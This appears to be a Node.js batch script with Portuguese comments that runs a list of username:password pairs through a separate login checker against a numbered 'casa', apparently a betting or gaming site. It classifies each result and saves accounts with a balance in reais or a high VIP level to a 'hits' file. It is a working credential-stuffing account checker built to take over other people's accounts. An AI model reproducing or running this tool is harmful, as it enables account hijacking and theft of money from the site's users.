// lote.js — serial, isolado, com retomada e diagnóstico
import fs from "fs";
import path from "path";
import { spawn } from "child_process";
import { ROOT } from "./src/paths.js";

const casa = process.argv[2] || "79";
const arquivo = process.argv[3] || "contas.txt";
const LIMITE = Number(process.env.LIMITE) || 120000;
const PAUSA = Number(process.env.PAUSA) || 400;
const MIN_SALDO = Number(process.env.MIN_SALDO) || 1;
const MIN_VIP = Number(process.env.MIN_VIP) || 3;

const dirHits = path.join(ROOT, "hits");
fs.mkdirSync(dirHits, { recursive: true });
const saida = path.join(dirHits, `lote_${casa}.txt`);
const hitsFile = path.join(dirHits, `hits_${casa}.txt`);
if (!fs.existsSync(saida)) fs.writeFileSync(saida, "");
if (!fs.existsSync(hitsFile)) fs.writeFileSync(hitsFile, "");

// só pula o que já teve veredito; INCONCLUSIVO e TIMEOUT são refeitos
const feitas = new Set();
for (const l of fs.readFileSync(saida, "utf-8").split(/\r?\n/)) {
  const p = l.split(" | ");
  if (!p[0]) continue;
  const st = (p[3] || "").trim();
  if (st === "INCONCLUSIVO" || st === "TIMEOUT") continue;
  feitas.add(p[0].trim());
}

const vistos = new Set();
const contas = [];
for (const bruta of fs.readFileSync(path.join(ROOT, arquivo), "utf-8").split(/\r?\n/)) {
  const l = bruta.replace(/\ufeff/g, "").replace(/\s*:\s*/g, ":").trim();
  if (!l.includes(":")) continue;
  const u = l.slice(0, l.indexOf(":")).trim();
  if (!u) continue;
  if (/^\d{11}$/.test(u) && u[2] !== "9") continue;
  if (feitas.has(l) || vistos.has(l)) continue;
  vistos.add(l);
  contas.push(l);
}

if (!contas.length) {
  console.log(`  nada a fazer — ${feitas.size} já com veredito em ${saida}`);
  process.exit(0);
}

console.log(`  casa ${casa} | ${contas.length} a fazer | limite ${LIMITE / 1000}s`);
console.log(`  hit = saldo >= R$${MIN_SALDO} ou vip >= ${MIN_VIP}\n`);

let ativo = true;
let filho = null;
process.on("SIGINT", () => {
  ativo = false;
  try { filho?.kill(); } catch {}
  console.log("\n  parando...");
});

const rodar = (conta) =>
  new Promise((resolve) => {
    filho = spawn(process.execPath, ["vip.js", casa, conta], { cwd: ROOT });
    let out = "";
    let morreu = false;
    const tm = setTimeout(() => {
      morreu = true;
      try { filho.kill(); } catch {}
    }, LIMITE);
    filho.stdout.on("data", (d) => (out += d));
    filho.stderr.on("data", (d) => (out += d));
    filho.on("close", () => {
      clearTimeout(tm);
      resolve({ out, morreu });
    });
  });

const classificar = (out, morreu) => {
  if (morreu) return "TIMEOUT";
  if (/incorret|incorreta|inválid|invalid/i.test(out)) return "SENHA_ERRADA";
  if (/não existe|nao existe|not found/i.test(out)) return "NAO_EXISTE";
  if (/proibid|bloquead|frozen/i.test(out)) return "PROIBIDA";
  if (/saldo[=:\s]/i.test(out) || /vip[=:\s]/i.test(out)) return "LOGIN_OK";
  return "INCONCLUSIVO";
};

let n = 0;
let hits = 0;

for (const conta of contas) {
  if (!ativo) break;
  n++;

  let { out, morreu } = await rodar(conta);

  if (/EADDRINUSE/i.test(out)) {
    await new Promise((r) => setTimeout(r, 1500));
    ({ out, morreu } = await rodar(conta));
  }

  const saldoM = out.match(/saldo[=:\s]+R?\$?\s*([\d]+[.,]?\d*)/i);
  const vipM = out.match(/vip[=:\s]+(\d+)/i);
  const saldo = saldoM ? Number(saldoM[1].replace(",", ".")) : null;
  const vip = vipM ? Number(vipM[1]) : null;

  const status = classificar(out, morreu);
  const linha = `${conta} | vip=${vip ?? "?"} | saldo=${saldo ?? "?"} | ${status}`;
  fs.appendFileSync(saida, linha + "\n", "utf-8");

  const ehHit = status === "LOGIN_OK" && ((saldo !== null && saldo >= MIN_SALDO) || (vip !== null && vip >= MIN_VIP));
  if (ehHit) {
    hits++;
    fs.appendFileSync(hitsFile, `${conta} | vip=${vip ?? "?"} | saldo=${saldo ?? "?"}\n`, "utf-8");
    console.log(`  HIT  ${conta} | vip=${vip ?? "?"} | saldo=${saldo ?? "?"}   [${hits}]`);
  } else if (status === "INCONCLUSIVO") {
    const motivo = out.replace(/\s+/g, " ").trim().slice(0, 500) || "(sem saida nenhuma)";
    console.log(`  INCONCL  ${conta} | ${motivo}`);
  } else {
    console.log(`  ${status.padEnd(13)} ${conta} | vip=${vip ?? "?"} | saldo=${saldo ?? "?"}`);
  }

  if (n % 10 === 0) console.log(`  -- ${n}/${contas.length} | hits ${hits}`);

  if (PAUSA) await new Promise((r) => setTimeout(r, PAUSA));
}

console.log(`\n  fim: ${n} percorridas | ${hits} hits | ${hitsFile}`);